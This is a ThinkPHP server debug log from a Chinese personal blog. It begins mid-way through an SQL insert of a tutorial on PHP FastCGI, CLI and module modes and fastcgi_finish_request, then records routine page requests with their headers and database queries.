255);\">使用的比较多。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">介绍：FastCGI是CGI的升级版本，FastCGI像是一个常驻 (long-live)型的 CGI。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">它可以一直执行着，只要激活后，不会每次都要花费时间去 Fork 一次。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">FastCGI是一个可伸缩地、高速地在HTTP server和动态脚本语言间通信的接口。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">Apache、Nginx、lighttpd 等流行的 HTTP server 都支持FastCGI。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">原理：</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">1.Web Server启动时载入FastCGI进程管理器（PHP-FPM）；</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">2.FastCGI进程管理器初始化启动多个CGI解释器进程并等待来自Web Server的连接；</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">3.当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器；</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">4.Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi；</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">5.FastCGI子进程完成处理后将标准输出和错误信息从同一连接返回Web Server。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">当FastCGI子进程关闭连接时，请求便告处理完成。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">FastCGI子进程接着等待并处理来自FastCGI进程管理器的下一个连接。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><strong style=\"box-sizing: border-box;\">CLI模式</strong></p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">介绍：PHP-CLI是PHP Command Line Interface的简称，就是PHP在命令行中运行。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">Windows、Linux下都支持PHP-CLI模式。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><strong style=\"box-sizing: border-box;\">模块模式</strong></p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">介绍：模块模式是以mod_php5模块的形式集成的。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">mod_php5模块的作用是接收Apache传递过来的PHP文件请求，并处理这些请求，然后将处理后的结果返回给Apache。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">Apache的配置文件httpd.conf中添加一行：</p><pre class=\"hljs smali\" style=\"box-sizing: border-box; overflow: auto; font-family: &quot;Source Code Pro&quot;, Consolas, Menlo, Monaco, &quot;Courier New&quot;, monospace; font-size: 0.93em; padding: 1em; margin-bottom: 1.5em; line-height: 1.45; word-break: break-all; word-wrap: break-word; color: rgb(51, 51, 51); border: none; border-radius: 4px; max-height: 35em; position: relative; margin-top: 0px !important;\">LoadModule&nbsp;php5_module&nbsp;modules/mod_php5.so</pre><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">以上只是简单的让大家了解下，如果有兴趣可以查阅相关文章。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">接下来，我们来介绍：fastcgi_finish_request。</p><blockquote style=\"box-sizing: border-box; padding: 10px 20px; margin: 1.5em 0px; font-size: 14px; border-left: 2px solid rgb(0, 154, 97); background: rgb(246, 246, 246); color: rgb(85, 85, 85); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; white-space: normal;\"><p style=\"box-sizing: border-box; margin-top: 0px; margin-bottom: 0px;\">fastcgi_finish_request</p></blockquote><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">PHP运行在FastCGI模式时，FPM提供的方法：fastcgi_finish_request。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">官方地址：<a href=\"http://php.net/manual/zh/function.fastcgi-finish-request.php\" target=\"_blank\" style=\"box-sizing: border-box; background: transparent; color: rgb(0, 154, 97); text-decoration-line: none; outline: 0px;\">http://php.net/manual/zh/func...</a></p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">官方解释：冲刷(flush)所有响应的数据给客户端。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">个人理解：在调用方法的时候，会发送响应，关闭连接，但是不会结束PHP的运行。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">不理解的可以直接运行如下代码：</p><pre class=\"hljs sqf\" style=\"box-sizing: border-box; overflow: auto; font-family: &quot;Source Code Pro&quot;, Consolas, Menlo, Monaco, &quot;Courier New&quot;, monospace; font-size: 0.93em; padding: 1em; margin-bottom: 1.5em; line-height: 1.45; word-break: break-all; word-wrap: break-word; color: rgb(51, 51, 51); border: none; border-radius: 4px; max-height: 35em; position: relative; margin-top: 0px !important;\">//代码：\r\necho&nbsp;date(&#39;Y-m-d&nbsp;H:i:s&#39;,&nbsp;time()).&quot;\\r\\n&quot;;&nbsp;//会输出\r\nfastcgi_finish_request();\r\nset_time_limit(0);&nbsp;&nbsp;//避免超时报错\r\nini_set(&#39;memory_limit&#39;,&nbsp;&#39;-1&#39;);&nbsp;&nbsp;//避免内存不足\r\nsleep(5);\r\n$time&nbsp;=&nbsp;date(&#39;Y-m-d&nbsp;H:i:s&#39;,&nbsp;time()).&quot;\\r\\n&quot;;\r\necho&nbsp;$time;&nbsp;//不会输出\r\nfile_put_contents(&#39;test.txt&#39;,&nbsp;$time,&nbsp;FILE_APPEND);</pre><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">执行这段函数后你会发现，可以实现异步操作，提高响应速度。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">可以使用fastcgi_finish_request()函数集成队列，可以把消息异步发送到队列。</p><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">因为这个函数只在FastCGI模式下存在，考虑可移植性可以加上以下代码：</p><pre class=\"hljs actionscript\" style=\"box-sizing: border-box; overflow: auto; font-family: &quot;Source Code Pro&quot;, Consolas, Menlo, Monaco, &quot;Courier New&quot;, monospace; font-size: 0.93em; padding: 1em; margin-bottom: 1.5em; line-height: 1.45; word-break: break-all; word-wrap: break-word; color: rgb(51, 51, 51); border: none; border-radius: 4px; max-height: 35em; position: relative; margin-top: 0px !important;\">if&nbsp;(!function_exists(&quot;fastcgi_finish_request&quot;))&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;fastcgi_finish_request()&nbsp;&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}</pre><p style=\"box-sizing: border-box; margin-top: 1.5em; margin-bottom: 1.5em; color: rgb(51, 51, 51); font-family: -apple-system, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Microsoft Yahei&quot;, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">大家可以根据自己的情况，进行尝试使用。</p><p><br/></p>' , 1 , 1 , 1 , '韩会强' , 'images/j668pc68_4gq9yhdxtbzg598c26ec8f7d1.jpg' , '123.233.116.122' , 1502357228 , 1502357228) [ RunTime:0.003864s ]

---------------------------------------------------------------
[ 2017-08-10T17:27:10+08:00 ] 172.17.180.47 123.233.116.122 GET /admin/article/index.html
[ log ] hhqblog.com/admin/article/index.html [运行时间：0.026841s][吞吐率：37.26req/s] [内存消耗：3,751.55kb] [文件加载：53]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://hhqblog.com/admin/article/add_article.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.10.1502335368.1502335210.',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Article->index[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/admin/view/article/index.html [ array (
  0 => 'allpage',
  1 => 'current',
  2 => 'keyword',
  3 => 'count',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000308s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000847s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` LIMIT 1 [ RunTime:0.000164s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` ORDER BY a.id desc LIMIT 0,10 [ RunTime:0.000834s ]

---------------------------------------------------------------
[ 2017-08-10T17:27:10+08:00 ] 172.17.180.47 123.233.116.122 GET /admin/article/index.html?page=1&keyword=
[ log ] hhqblog.com/admin/article/index.html?page=1&keyword= [运行时间：0.030117s][吞吐率：33.20req/s] [内存消耗：3,682.59kb] [文件加载：52]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'referer' => 'http://hhqblog.com/admin/article/index.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.10.1502335368.1502335210.',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'page' => '1',
  'keyword' => '',
)
[ info ] [ RUN ] app\admin\controller\Article->index[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000306s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000831s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` LIMIT 1 [ RunTime:0.000155s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` ORDER BY a.id desc LIMIT 0,10 [ RunTime:0.000829s ]

---------------------------------------------------------------
[ 2017-08-10T17:30:20+08:00 ] 172.17.180.47 123.233.116.122 GET /
[ log ] hhqblog.com/ [运行时间：0.033455s][吞吐率：29.89req/s] [内存消耗：5,400.52kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.10.1502335368.1502335210.',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000334s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000830s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000753s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 1 ORDER BY id desc LIMIT 6 [ RunTime:0.000419s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000352s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000398s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000709s ]

---------------------------------------------------------------
[ 2017-08-10T17:30:20+08:00 ] 172.17.180.47 123.233.116.122 GET /index/index/index.html?page=1
[ log ] hhqblog.com/index/index/index.html?page=1 [运行时间：0.038818s][吞吐率：25.76req/s] [内存消耗：5,388.91kb] [文件加载：55]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'referer' => 'http://hhqblog.com/',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.10.1502335368.1502335210.',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'page' => '1',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000327s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000815s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000766s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000412s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000468s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000746s ]

---------------------------------------------------------------
[ 2017-08-10T17:30:47+08:00 ] 172.17.180.47 123.233.116.122 GET /ar/54
[ log ] www.hhqblog.com/ar/54 [运行时间：0.034398s][吞吐率：29.07req/s] [内存消耗：4,233.59kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'Artical',
    2 => 'detail',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://hhqblog.com/',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'bdshare_firstime=1502176507013; _pk_ref.1.c6f5=%5B%22%22%2C%22%22%2C1502348206%2C%22http%3A%2F%2Fhhqblog.com%2F%22%5D; _pk_id.1.c6f5=8954b2a892899c3c.1500952384.9.1502348229.1502348206.',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '54',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Artical->detail[ /yjdata/www/hhqblog/application/index/controller/Artical.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/artical/detail.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'article',
  5 => 'allpage',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000312s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.001922s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000838s ]
[ sql ] [ SQL ] SELECT `a`.*,`ca`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ca` ON `a`.`cate_id`=`ca`.`id` WHERE  `a`.`id` = 54 LIMIT 1 [ RunTime:0.000313s ]

---------------------------------------------------------------
[ 2017-08-10T17:43:35+08:00 ] 172.17.180.47 5.255.250.29 GET /ar/48.html
[ log ] www.hhqblog.com/ar/48.html [运行时间：0.031744s][吞吐率：31.50req/s] [内存消耗：4,285.55kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'Artical',
    2 => 'detail',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'Keep-Alive',
